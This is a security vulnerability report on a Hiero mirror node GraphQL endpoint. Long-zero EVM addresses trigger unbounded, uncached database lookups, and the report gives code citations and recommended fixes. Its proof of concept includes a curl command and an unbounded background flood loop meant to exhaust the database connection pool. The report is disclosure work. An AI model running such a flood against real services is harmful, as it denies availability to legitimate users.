### Title
Unauthenticated GraphQL Long-Zero EVM Address Triggers Unbounded Uncached DB Primary-Key Lookups

### Summary
`EntityServiceImpl.getByEvmAddressAndType` detects a long-zero EVM address (first 12 bytes zero) and routes directly to `entityRepository.findById(entityNum)` using the last 8 bytes as the entity ID. No validation bounds the extracted entity number, no caching exists on the GraphQL `EntityRepository`, and the GraphQL module has no rate-limiting, allowing any unauthenticated caller to drive an arbitrary number of guaranteed database round-trips by repeatedly submitting crafted long-zero addresses.

### Finding Description
**Exact code path:**

`AccountController.account()` → `EntityService.getByEvmAddressAndType(evmAddress, ACCOUNT)` → `EntityServiceImpl` lines 34–41:

```java
// EntityServiceImpl.java lines 34-41
public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
    byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
    var buffer = ByteBuffer.wrap(evmAddressBytes);
    if (buffer.getInt() == 0 && buffer.getLong() == 0) {          // bytes 0-11 == 0
        return entityRepository.findById(buffer.getLong())         // bytes 12-19 → entity num
                               .filter(e -> e.getType() == type);
    }
    return entityRepository.findByEvmAddress(evmAddressBytes)...;
}
```

**Root cause:** The long-zero branch extracts bytes 12–19 as a raw `long` with no range check and immediately issues `findById(entityNum)`. `Long.MAX_VALUE` (`0x7FFFFFFFFFFFFFFF`) satisfies the zero-prefix condition and is a valid `long`, so the call proceeds unconditionally.

**Why existing checks fail:**

- `GraphQlConfiguration` installs `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)`, but a single-field `account` query has complexity 1 and depth 1 — both well within limits.
- Parser limits (10 000 chars, 1 000 tokens) are irrelevant; the payload is ~80 bytes.
- The `ThrottleConfiguration` / `ThrottleManagerImpl` (bucket4j) exists only in the `web3` module; the `graphql` module has no equivalent.
- The graphql `EntityRepository` carries no `@Cacheable` annotation, unlike the `web3` `EntityRepository`, so every `findById` call hits the database. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
Each crafted request forces one synchronous JDBC round-trip (`SELECT * FROM entity WHERE id = 9223372036854775807`). Because the row never exists, the query always misses and returns empty, but the connection is still checked out from the HikariCP pool and a network + DB-engine round-trip is consumed. Under sustained flood, this exhausts the connection pool (the Helm chart already monitors `hikaricp_connections_active / hikaricp_connections_max > 0.75` as a critical alert), causing legitimate queries to queue or time out. No data is leaked or modified; the impact is availability degradation (griefing). [4](#0-3) 

### Likelihood Explanation
The GraphQL endpoint is publicly reachable with no authentication requirement. The exploit requires only a standard HTTP POST with a 40-character hex string; no special tooling, credentials, or on-chain state is needed. The attack is trivially scriptable and repeatable at high frequency from a single host or distributed across IPs to evade network-level rate limiting. [5](#0-4) 

### Recommendation
1. **Validate entity num range** in `getByEvmAddressAndType` before calling `findById`: reject any extracted `entityNum` that exceeds the maximum valid Hedera entity number (e.g., `EntityId.NUM_UPPER_BOUND` or the configured shard/realm/num limits).
2. **Add rate limiting** to the GraphQL module analogous to `ThrottleConfiguration` in `web3`, using bucket4j or Spring's `RateLimiter` on the `/graphql` endpoint.
3. **Add caching** on `EntityRepository.findById` in the graphql module (mirroring the `@Cacheable` pattern in the `web3` `EntityRepository`) so repeated lookups for the same non-existent ID do not hit the database. [6](#0-5) [7](#0-6) 

### Proof of Concept
```
# Long-zero address with entity num = Long.MAX_VALUE
# Bytes 0-11: 000000000000000000000000
# Bytes 12-19: 7FFFFFFFFFFFFFFF

curl -s -X POST https://<mirror-node-graphql>/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query { account(input: { evmAddress: \"0x0000000000000000000000007FFFFFFFFFFFFFFF\" }) { id } }"
  }'

# Expected: {"data":{"account":null}}  (empty result, but DB was queried)

# Flood loop (no auth required):
while true; do
  curl -s -X POST https://<mirror-node-graphql>/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"query{account(input:{evmAddress:\"0x0000000000000000000000007FFFFFFFFFFFFFFF\"}){id}}"}' &
done
```

Each iteration executes `SELECT * FROM entity WHERE id = 9223372036854775807` against the database. With sufficient concurrency the HikariCP pool is exhausted and legitimate requests begin failing.

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java (L34-41)
```java
    public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
        byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
        var buffer = ByteBuffer.wrap(evmAddressBytes);
        if (buffer.getInt() == 0 && buffer.getLong() == 0) {
            return entityRepository.findById(buffer.getLong()).filter(e -> e.getType() == type);
        }
        return entityRepository.findByEvmAddress(evmAddressBytes).filter(e -> e.getType() == type);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L41-48)
```java
    @Bean
    GraphQlSourceBuilderCustomizer graphQlCustomizer(PreparsedDocumentProvider provider) {
        var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
        var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
        var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);

        return b -> b.configureGraphQl(
                graphQL -> graphQL.instrumentation(instrumentation).preparsedDocumentProvider(provider));
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java (L11-17)
```java
@GraphQlRepository
public interface EntityRepository extends CrudRepository<Entity, Long> {
    @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByAlias(byte[] alias);

    @Query(value = "select * from entity where evm_address = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByEvmAddress(byte[] evmAddress);
```

**File:** charts/hedera-mirror-graphql/values.yaml (L204-214)
```yaml
  GraphQLHighDBConnections:
    annotations:
      description: "{{ $labels.namespace }}/{{ $labels.pod }} is using {{ $value | humanizePercentage }} of available database connections"
      summary: "Mirror GraphQL API database connection utilization exceeds 75%"
    enabled: true
    expr: sum(hikaricp_connections_active{application="graphql"}) by (namespace, pod) / sum(hikaricp_connections_max{application="graphql"}) by (namespace, pod) > 0.75
    for: 5m
    labels:
      application: graphql
      area: resource
      severity: critical
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java (L51-55)
```java
        if (evmAddress != null) {
            return entityService
                    .getByEvmAddressAndType(evmAddress, EntityType.ACCOUNT)
                    .map(accountMapper::map);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L24-32)
```java
    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/EntityRepository.java (L20-30)
```java
    @Caching(
            cacheable = {
                @Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_ENTITY, unless = "#result == null"),
                @Cacheable(
                        cacheNames = CACHE_NAME,
                        cacheManager = CACHE_MANAGER_SYSTEM_ACCOUNT,
                        condition =
                                "#entityId < 1000 && !T(org.hiero.mirror.web3.common.ContractCallContext).isBalanceCallSafe()",
                        unless = "#result == null")
            })
    Optional<Entity> findByIdAndDeletedIsFalse(Long entityId);
```
